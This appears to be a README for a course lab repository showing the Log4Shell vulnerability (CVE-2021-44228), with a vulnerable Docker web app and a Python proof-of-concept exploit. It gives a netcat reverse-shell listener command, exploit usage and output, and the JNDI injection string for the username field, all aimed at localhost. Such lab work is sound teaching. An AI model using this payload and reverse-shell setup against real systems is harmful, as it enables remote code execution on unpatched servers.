# log4shell
A demonstration for the recently found CVE-2021-44228 vulnerability. <br><br>
This new vulnerability was a zero-day in Log4j, a popular java logging framework, involving arbitrary code execution.
This repository contains a vulnerable web application which utalizes log4j and an exploit (PoC). 


Exploit (PoC)
----------------------
For the exploit, please use the python file:

#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] ISEC3004 

[+] Exploit Success!
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
...

The python script sets up the HTTP and LDAP Server, in addition to creating the Payload. The Payload needs to be inserted into the vulnerable parameter (Username Field)

<br>


Vulnerable application
-----------------------

Use the following steps to initialize the docker:
```c
1: docker build -t log4shell .
2: docker run --network host log4shell
```
Once it is running, you can access it on localhost:8080

<br>

Installing Java version.
--------------------------------------

At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.

Download the Java Version '8u20' from the link below:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>

**Note:** Please make sure to extract the jdk folder into the repository with the same name.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```
